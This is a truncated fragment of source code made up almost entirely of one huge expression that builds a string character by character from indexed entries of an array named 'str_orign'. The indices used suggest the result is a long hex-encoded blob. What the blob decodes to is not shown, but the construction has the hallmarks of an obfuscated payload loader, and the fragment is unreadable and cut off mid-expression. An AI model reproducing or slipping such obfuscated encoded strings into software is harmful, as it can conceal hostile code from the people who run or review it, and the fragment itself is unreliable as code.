str_orign[35] + str_orign[5] + str_orign[1] + str_orign[32] + str_orign[29] + str_orign[0] + str_orign[29] + str_orign[0] + str_orign[29] + str_orign[3] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[29] + str_orign[33] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[35] + str_orign[0] + str_orign[2] + str_orign[28] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[2] + str_orign[35] + str_orign[27] + str_orign[27] + str_orign[2] + str_orign[27] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[2] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[35] + str_orign[3] + str_orign[29] + str_orign[26] + str_orign[35] + str_orign[26] + str_orign[2] + str_orign[26] + str_orign[4] + str_orign[27] + str_orign[4] + str_orign[3] + str_orign[30] + str_orign[27] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[26] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[27] + str_orign[27] + str_orign[35] + str_orign[33] + str_orign[1] + str_orign[29] + str_orign[27] + str_orign[28] + str_orign[2] + str_orign[29] + str_orign[33] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[35] + str_orign[31] + str_orign[31] + str_orign[33] + str_orign[26] + str_orign[32] + str_orign[33] + str_orign[26] + str_orign[33] + str_orign[35] + str_orign[1] + str_orign[35] + str_orign[27] + str_orign[32] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[33] + str_orign[1] + str_orign[33] + str_orign[35] + str_orign[33] + str_orign[33] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[30] + str_orign[2] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[32] + str_orign[29] + str_orign[33] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[35] + str_orign[30] + str_orign[35] + str_orign[33] + str_orign[1] + str_orign[29] + str_orign[33] + str_orign[26] + str_orign[33] + str_orign[29] + str_orign[29] + str_orign[33] + str_orign[1] + str_orign[29] + str_orign[35] + str_orign[27] + str_orign[35] + str_orign[29] + str_orign[34] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[35] + str_orign[4] + str_orign[28] + str_orign[30] + str_orign[31] + str_orign[29] + str_orign[33] + str_orign[5] + str_orign[5] + str_orign[2] + str_orign[34] + str_orign[29] + str_orign[26] + str_orign[33] + str_orign[1] + str_orign[28] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[29] + str_orign[33] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[31] + str_orign[29] + str_orign[3] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[29] + str_orign[33] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[35] + str_orign[0] + str_orign[2] + str_orign[29] + str_orign[26] + str_orign[2] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[35] + str_orign[3] + str_orign[29] + str_orign[26] + str_orign[35] + str_orign[26] + str_orign[2] + str_orign[26] + str_orign[28] + str_orign[33] + str_orign[4] + str_orign[35] + str_orign[32] + str_orign[30] + str_orign[5] + str_orign[26] + str_orign[29] + str_orign[2] + str_orign[35] + str_orign[28] + str_orign[29] + str_orign[2] + str_orign[27] + str_orign[29] + str_orign[35] + str_orign[33] + str_orign[29] + str_orign[30] + str_orign[28] + str_orign[34] + str_orign[3] + str_orign[26] + str_orign[32] + str_orign[30] + str_orign[3] + str_orign[33] + str_orign[30] + str_orign[33] + str_orign[29] + str_orign[29] + str_orign[33] + str_orign[1] + str_orign[29] + str_orign[35] + str_orign[27] + str_orign[29] + str_orign[29] + str_orign[34] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[35] + str_orign[31] + str_orign[31] + str_orign[29] + str_orign[26] + str_orign[33] + str_orign[1] + str_orign[35] + str_orign[2] + str_orign[29] + str_orign[33] + str_orign[29] + str_orign[29] + str_orign[33] + str_orign[1] + str_orign[29] + str_orign[35] + str_orign[26] + str_orign[2] + str_orign[29] + str_orign[34] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[33] + str_orign[1] + str_orign[35] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[29] + str_orign[33] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[33] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[33] + str_orign[30] + str_orign[4] + str_orign[30] + str_orign[34] + str_orign[30] + str_orign[0] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[33] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[34] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[0] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[28] + str_orign[4] + str_orign[2] + str_orign[27] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[27] + str_orign[5] + str_orign[5] + str_orign[4] + str_orign[35] + str_orign[30] + str_orign[33] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[34] + str_orign[30] + str_orign[0] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[1] + str_orign[26] + str_orign[27] + str_orign[4] + str_orign[34] + str_orign[29] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[30] + str_orign[3] + str_orign[31] + str_orign[0] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[34] + str_orign[1] + str_orign[4] + str_orign[32] + str_orign[32] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[29] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[31] + str_orign[29] + str_orign[34] + str_orign[33] + str_orign[34] + str_orign[4] + str_orign[31] + str_orign[29] + str_orign[2] + str_orign[33] + str_orign[34] + str_orign[5] + str_orign[26] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[0] + str_orign[29] + str_orign[2] + str_orign[32] + str_orign[32] + str_orign[27] + str_orign[31] + str_orign[35] + str_orign[32] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[29] + str_orign[33] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[29] + str_orign[33] + str_orign[28] + str_orign[26] + str_orign[3] + str_orign[27] + str_orign[29] + str_orign[3] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[35] + str_orign[29] + str_orign[3] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[0] + str_orign[28] + str_orign[0] + str_orign[30] + str_orign[31] + str_orign[32] + str_orign[34] + str_orign[0] + str_orign[32] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[4] + str_orign[1] + str_orign[32] + str_orign[28] + str_orign[30] + str_orign[0] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[34] + str_orign[2] + str_orign[26] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[33] + str_orign[34] + str_orign[27] + str_orign[26] + str_orign[5] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[3] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[26] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[26] + str_orign[31] + str_orign[0] + str_orign[35] + str_orign[28] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[26] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[0] + str_orign[30] + str_orign[32] + str_orign[33] + str_orign[34] + str_orign[34] + str_orign[5] + str_orign[2] + str_orign[31] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[4] + str_orign[1] + str_orign[30] + str_orign[34] + str_orign[30] + str_orign[1] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[34] + str_orign[2] + str_orign[26] + str_orign[29] + str_orign[33] + str_orign[28] + str_orign[26] + str_orign[3] + str_orign[27] + str_orign[29] + str_orign[34] + str_orign[33] + str_orign[34] + str_orign[3] + str_orign[33] + str_orign[29] + str_orign[3] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[30] + str_orign[27] + str_orign[31] + str_orign[33] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[27] + str_orign[29] + str_orign[35] + str_orign[33] + str_orign[29] + str_orign[30] + str_orign[27] + str_orign[30] + str_orign[27] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[0] + str_orign[4] + str_orign[1] + str_orign[30] + str_orign[30] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[1] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[34] + str_orign[2] + str_orign[31] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[28] + str_orign[2] + str_orign[28] + str_orign[30] + str_orign[35] + str_orign[31] + str_orign[0] + str_orign[35] + str_orign[0] + str_orign[30] + str_orign[5] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[34] + str_orign[5] + str_orign[26] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[34] + str_orign[3] + str_orign[0] + str_orign[29] + str_orign[34] + str_orign[2] + str_orign[32] + str_orign[2] + str_orign[35] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[29] + str_orign[3] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[30] + str_orign[27] + str_orign[30] + str_orign[27] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[0] + str_orign[27] + str_orign[3] + str_orign[35] + str_orign[31] + str_orign[26] + str_orign[33] + str_orign[32] + str_orign[1] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[33] + str_orign[30] + str_orign[2] + str_orign[35] + str_orign[35] + str_orign[5] + str_orign[33] + str_orign[30] + str_orign[34] + str_orign[3] + str_orign[35] + str_orign[26] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[33] + str_orign[5] + str_orign[5] + str_orign[2] + str_orign[5] + str_orign[35] + str_orign[5] + str_orign[33] + str_orign[29] + str_orign[33] + str_orign[2] + str_orign[35] + str_orign[26] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[4] + str_orign[1] + str_orign[3] + str_orign[28] + str_orign[4] + str_orign[34] + str_orign[4] + str_orign[29] + str_orign[35] + str_orign[26] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[4] + str_orign[33] + str_orign[0] + str_orign[27] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[27] + str_orign[5] + str_orign[31] + str_orign[0] + str_orign[32] + str_orign[26] + str_orign[32] + str_orign[30] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[32] + str_orign[34] + str_orign[27] + str_orign[3] + str_orign[28] + str_orign[28] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[28] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[27] + str_orign[27] + str_orign[4] + str_orign[32] + str_orign[28] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[3] + str_orign[27] + str_orign[4] + str_orign[31] + str_orign[3] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[4] + str_orign[27] + str_orign[4] + str_orign[31] + str_orign[0] + str_orign[32] + str_orign[28] + str_orign[35] + str_orign[35] + str_orign[0] + str_orign[27] + str_orign[3] + str_orign[30] + str_orign[35] + str_orign[26] + str_orign[35] + str_orign[26] + str_orign[31] + str_orign[2] + str_orign[27] + str_orign[5] + str_orign[4] + str_orign[30] + str_orign[32] + str_orign[5] + str_orign[34] + str_orign[3] + str_orign[31] + str_orign[34] + str_orign[26] + str_orign[0] + str_orign[1] + str_orign[33] + str_orign[2] + str_orign[34] + str_orign[2] + str_orign[29] + str_orign[26] + str_orign[28] + str_orign[34] + str_orign[29] + str_orign[34] + str_orign[35] + str_orign[2] + str_orign[2] + str_orign[29] + str_orign[1] + str_orign[31] + str_orign[33] + str_orign[31] + str_orign[2] + str_orign[0] + str_orign[29] + str_orign[30] + str_orign[34] + str_orign[35] + str_orign[32] + str_orign[31] + str_orign[27] + str_orign[28] + str_orign[29] + str_orign[28] + str_orign[2] + str_orign[30] + str_orign[30] + str_orign[32] + str_orign[33] + str_orign[5] + str_orign[1] + str_orign[4] + str_orign[33] + str_orign[28] + str_orign[27] + str_orign[3] + str_orign[1] + str_orign[32] + str_orign[29] + str_orign[5] + str_orign[28] + str_orign[2] + str_orign[34] + str_orign[26] + str_orign[31] + str_orign[29] + str_orign[27] + str_orign[28] + str_orign[32] + str_orign[32] + str_orign[35] + str_orign[27] + str_orign[26] + str_orign[32] + str_orign[3] + str_orign[34] + str_orign[30] + str_orign[28] + str_orign[29] + str_orign[33] + str_orign[4] + str_orign[4] + str_orign[2] + str_orign[5] + str_orign[26] + str_orign[3] + str_orign[33] + str_orign[4] + str_orign[5] + str_orign[32] + str_orign[1] + str_orign[30] + str_orign[0] + str_orign[34] + str_orign[1] + str_orign[29] + str_orign[33] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[33] + str_orign[32] + str_orign[29] + str_orign[27] + str_orign[5] + str_orign[31] + str_orign[33] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[3] + str_orign[31] + str_orign[2] + str_orign[27] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[35] + str_orign[32] + str_orign[35] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[5] + str_orign[31] + str_orign[4] + str_orign[27] + str_orign[5] + str_orign[32] + str_orign[33] + str_orign[31] + str_orign[33] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[3] + str_orign[31] + str_orign[2] + str_orign[27] + str_orign[1] + str_orign[32] + str_orign[33] + str_orign[31] + str_orign[3] + str_orign[31] + str_orign[2] + str_orign[27] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[35] + str_orign[32] + str_orign[35] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[5] + str_orign[31] + str_orign[4] + str_orign[27] + str_orign[5] + str_orign[32] + str_orign[33] + str_orign[31] + str_orign[3] + str_orign[31] + str_orign[2] + str_orign[28] + str_orign[1] + str_orign[32] + str_orign[26] + str_orign[28] + str_orign[3] + str_orign[28] + str_orign[35] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[34] + str_orign[27] + str_orign[2] + str_orign[27] + str_orign[0] + str_orign[27] + str_orign[5] + str_orign[27] + str_orign[0] + str_orign[28] + str_orign[1] + str_orign[32] + str_orign[26] + str_orign[28] + str_orign[3] + str_orign[28] + str_orign[35] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[33] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[0] + str_orign[29] + str_orign[26] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[27] + str_orign[3] + str_orign[29] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[32] + str_orign[32] + str_orign[30] + str_orign[31] + str_orign[26] + str_orign[31] + str_orign[32] + str_orign[31] + str_orign[30] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[35] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[4] + str_orign[27] + str_orign[3] + str_orign[30] + str_orign[30] + str_orign[30] + str_orign[28] + str_orign[27] + str_orign[2] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[4] + str_orign[28] + str_orign[1] + str_orign[32] + str_orign[26] + str_orign[28] + str_orign[3] + str_orign[28] + str_orign[35] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[30] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[0] + str_orign[30] + str_orign[27] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[31] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[35] + str_orign[31] + str_orign[33] + str_orign[32] + str_orign[29] + str_orign[32] + str_orign[29] + str_orign[32] + str_orign[35] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[5] + str_orign[27] + str_orign[5] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[5] + str_orign[31] + str_orign[29] + str_orign[31] + str_orign[30] + str_orign[27] + str_orign[4] + str_orign[31] + str_orign[0] + str_orign[32] + str_orign[26] + str_orign[32] + str_orign[30] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[32] + str_orign[34] + str_orign[27] + str_orign[4] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[5] + str_orign[31] + str_orign[3] + str_orign[27] + str_orign[5] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[0] + str_orign[29] + str_orign[26] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[27] + str_orign[3] + str_orign[29] + str_orign[30] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[5] + str_orign[31] + str_orign[29] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[32] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[35] + str_orign[31] + str_orign[32] + str_orign[32] + str_orign[0] + str_orign[31] + str_orign[34] + str_orign[32] + str_orign[35] + str_orign[27] + str_orign[2] + str_orign[27] + str_orign[35] + str_orign[31] + str_orign[29] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[31] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[30] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[0] + str_orign[30] + str_orign[30] + str_orign[32] + str_orign[28] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[27] + str_orign[3] + str_orign[29] + str_orign[26] + str_orign[31] + str_orign[32] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[4] + str_orign[32] + str_orign[29] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[35] + str_orign[29] + str_orign[3] + str_orign[31] + str_orign[5] + str_orign[32] + str_orign[0] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[27] + str_orign[5] + str_orign[28] + str_orign[30] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[35] + str_orign[27] + str_orign[35] + str_orign[27] + str_orign[33] + str_orign[30] + str_orign[32] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[29] + str_orign[31] + str_orign[5] + str_orign[32] + str_orign[32] + str_orign[32] + str_orign[28] + str_orign[27] + str_orign[35] + str_orign[29] + str_orign[4] + str_orign[30] + str_orign[29] + str_orign[27] + str_orign[35] + str_orign[28] + str_orign[31] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[28] + str_orign[28] + str_orign[1] + str_orign[27] + str_orign[35] + str_orign[30] + str_orign[29] + str_orign[32] + str_orign[27] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[29] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[4] + str_orign[32] + str_orign[29] + str_orign[27] + str_orign[5] + str_orign[28] + str_orign[32] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[35] + str_orign[28] + str_orign[1] + str_orign[27] + str_orign[35] + str_orign[32] + str_orign[27] + str_orign[32] + str_orign[31] + str_orign[28] + str_orign[0] + str_orign[28] + str_orign[26] + str_orign[28] + str_orign[26] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[35] + str_orign[27] + str_orign[34] + str_orign[27] + str_orign[35] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[1] + str_orign[31] + str_orign[30] + str_orign[27] + str_orign[35] + str_orign[29] + str_orign[32] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[1] + str_orign[31] + str_orign[5] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[0] + str_orign[35] + str_orign[35] + str_orign[4] + str_orign[29] + str_orign[34] + str_orign[29] + str_orign[28] + str_orign[31] + str_orign[35] + str_orign[33] + str_orign[4] + str_orign[29] + str_orign[0] + str_orign[31] + str_orign[28] + str_orign[4] + str_orign[31] + str_orign[35] + str_orign[30] + str_orign[35] + str_orign[1] + str_orign[27] + str_orign[31] + str_orign[28] + str_orign[26] + str_orign[1] + str_orign[26] + str_orign[35] + str_orign[30] + str_orign[31] + str_orign[32] + str_orign[2] + str_orign[1] + str_orign[29] + str_orign[31] + str_orign[27] + str_orign[1] + str_orign[28] + str_orign[3] + str_orign[34] + str_orign[1] + str_orign[2] + str_orign[28] + str_orign[31] + str_orign[5] + str_orign[28] + str_orign[4] + str_orign[32] + str_orign[33] + str_orign[26] + str_orign[27] + str_orign[1] + str_orign[1] + str_orign[32] + str_orign[31] + str_orign[28] + str_orign[28] + str_orign[0] + str_orign[29] + str_orign[5] + str_orign[28] + str_orign[3] + str_orign[33] + str_orign[32] + str_orign[26] + str_orign[35] + str_orign[2] + str_orign[2] + str_orign[29] + str_orign[35] + str_orign[1] + str_orign[29] + str_orign[4] + str_orign[29] + str_orign[31] + str_orign[0] + str_orign[2] + str_orign[33] + str_orign[29] + str_orign[33] + str_orign[26] + str_orign[31] + str_orign[0] + str_orign[35] + str_orign[32] + str_orign[1] + str_orign[33] + str_orign[28] + str_orign[33] + str_orign[3] + str_orign[27] + str_orign[0] + str_orign[31] + str_orign[4] + str_orign[26] + str_orign[28] + str_orign[33] + str_orign[5] + str_orign[1] + str_orign[32] + str_orign[31] + str_orign[34] + str_orign[26] + str_orign[1] + str_orign[0] + str_orign[35] + str_orign[3] + str_orign[1] + str_orign[27] + str_orign[34] + str_orign[1] + str_orign[34] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[4] + str_orign[5] + str_orign[35] + str_orign[1] + str_orign[30] + str_orign[0] + str_orign[27] + str_orign[30] + str_orign[31] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[29] + str_orign[33] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[1] + str_orign[0] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[33] + str_orign[35] + str_orign[35] + str_orign[26] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[34] + str_orign[29] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[0] + str_orign[30] + str_orign[33] + str_orign[0] + str_orign[29] + str_orign[30] + str_orign[28] + str_orign[4] + str_orign[30] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[29] + str_orign[33] + str_orign[34] + str_orign[28] + str_orign[30] + str_orign[28] + str_orign[30] + str_orign[28] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[34] + str_orign[4] + str_orign[32] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[34] + str_orign[5] + str_orign[26] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[34] + str_orign[3] + str_orign[0] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[33] + str_orign[35] + str_orign[35] + str_orign[27] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[34] + str_orign[33] + str_orign[34] + str_orign[5] + str_orign[34] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[0] + str_orign[26] + str_orign[27] + str_orign[34] + str_orign[31] + str_orign[33] + str_orign[34] + str_orign[4] + str_orign[27] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[28] + str_orign[2] + str_orign[29] + str_orign[27] + str_orign[35] + str_orign[33] + str_orign[30] + str_orign[2] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[1] + str_orign[31] + str_orign[31] + str_orign[31] + str_orign[33] + str_orign[1] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[33] + str_orign[35] + str_orign[26] + str_orign[2] + str_orign[28] + str_orign[33] + str_orign[30] + str_orign[2] + str_orign[35] + str_orign[32] + str_orign[30] + str_orign[3] + str_orign[32] + str_orign[30] + str_orign[33] + str_orign[30] + str_orign[33] + str_orign[30] + str_orign[33] + str_orign[29] + str_orign[33] + str_orign[35] + str_orign[30] + str_orign[0] + str_orign[5] + str_orign[35] + str_orign[5] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[30] + str_orign[35] + str_orign[2] + str_orign[28] + str_orign[4] + str_orign[33] + str_orign[34] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[28] + str_orign[26] + str_orign[28] + str_orign[35] + str_orign[28] + str_orign[26] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[29] + str_orign[28] + str_orign[27] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[26] + str_orign[28] + str_orign[32] + str_orign[28] + str_orign[30] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[33] + str_orign[28] + str_orign[34] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[30] + str_orign[5] + str_orign[30] + str_orign[4] + str_orign[26] + str_orign[35] + str_orign[35];
            // chen haodong str = str + str_orign[5] + str_orign[2] + str_orign[4] + str_orign[33] + str_orign[33] + str_orign[34] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[31] + str_orign[35] + str_orign[33] + str_orign[34] + str_orign[4] + str_orign[30] + str_orign[28] + str_orign[26] + str_orign[3] + str_orign[27] + str_orign[31] + str_orign[29] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[27] + str_orign[28] + str_orign[35] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[27] + str_orign[35] + str_orign[2] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[27] + str_orign[26] + str_orign[29] + str_orign[33] + str_orign[1] + str_orign[32] + str_orign[27] + str_orign[27] + str_orign[33] + str_orign[35] + str_orign[5] + str_orign[1] + str_orign[32] + str_orign[29] + str_orign[0] + str_orign[27] + str_orign[31] + str_orign[28] + str_orign[26] + str_orign[5] + str_orign[5] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[35] + str_orign[0] + str_orign[2] + str_orign[28] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[2] + str_orign[35] + str_orign[27] + str_orign[27] + str_orign[2] + str_orign[27] + str_orign[35] + str_orign[2] + str_orign[26] + str_orign[2] + str_orign[5] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[26] + str_orign[2] + str_orign[32] + str_orign[4] + str_orign[27] + str_orign[5] + str_orign[35] + str_orign[30] + str_orign[27] + str_orign[30] + str_orign[32] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[27] + str_orign[26] + str_orign[35] + str_orign[33] + str_orign[1] + str_orign[29] + str_orign[27] + str_orign[28] + str_orign[2] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[35] + str_orign[33] + str_orign[1] + str_orign[29] + str_orign[35] + str_orign[32] + str_orign[33] + str_orign[33] + str_orign[30] + str_orign[2] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[29] + str_orign[0] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[35] + str_orign[30] + str_orign[35] + str_orign[33] + str_orign[1] + str_orign[29] + str_orign[33] + str_orign[26] + str_orign[33] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[33] + str_orign[27] + str_orign[35] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[28] + str_orign[4] + str_orign[28] + str_orign[28] + str_orign[2] + str_orign[29] + str_orign[34] + str_orign[33] + str_orign[1] + str_orign[28] + str_orign[29] + str_orign[33] + str_orign[1] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[31] + str_orign[28] + 